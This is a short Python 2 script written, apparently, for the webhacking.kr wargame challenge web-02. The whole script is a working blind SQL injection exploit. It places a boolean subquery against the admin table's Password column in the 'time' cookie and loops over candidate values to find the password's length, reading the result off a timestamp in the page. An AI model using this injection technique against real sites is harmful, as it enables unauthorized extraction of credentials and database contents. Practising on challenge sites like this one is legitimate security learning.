import urllib, urllib2

admin_password=""
board_password=""

space="%20"

for i in range(1,20):
	url="http://webhacking.kr/challenge/web/web-02/"
        req=urllib2.Request(url)
        req.add_header('Cookie','PHPSESSID=3bb9114aa60b7cda5d6ee6ba78bdbadd;time=1470735436 and(select(length(Password)) from admin)=%d' % (i))
        res=urllib2.urlopen(req)

        if "2017-01-01 09:00:01" in res.read():
            print i 
            break
	


